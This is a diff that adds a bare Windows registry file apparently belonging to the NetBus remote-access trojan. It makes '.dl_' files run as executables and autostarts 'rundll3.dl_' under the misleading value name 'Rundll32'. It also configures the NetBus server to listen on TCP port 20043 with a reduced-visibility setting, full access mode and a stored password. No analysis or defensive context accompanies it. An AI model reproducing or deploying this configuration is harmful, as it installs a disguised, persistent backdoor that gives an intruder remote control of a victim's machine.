@@ -1,0 +1,25 @@
+REGEDIT4
+
+[HKEY_CLASSES_ROOT\.dl_]
+@="exefile"
+"Content Type"="application/x-msdownload"
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
+"Rundll32"="rundll3.dl_"
+
+
+[HKEY_LOCAL_MACHINE\Software\Net Solutions]
+
+[HKEY_LOCAL_MACHINE\Software\Net Solutions\NetBus Server]
+
+[HKEY_LOCAL_MACHINE\Software\Net Solutions\NetBus Server\General]
+"Accept"="1"
+"TCPPort"="20043"
+"Visibility"="3"
+"AccessMode"="2"
+
+[HKEY_LOCAL_MACHINE\Software\Net Solutions\NetBus Server\Protection]
+"Password"="&3$$/"
+
+
+
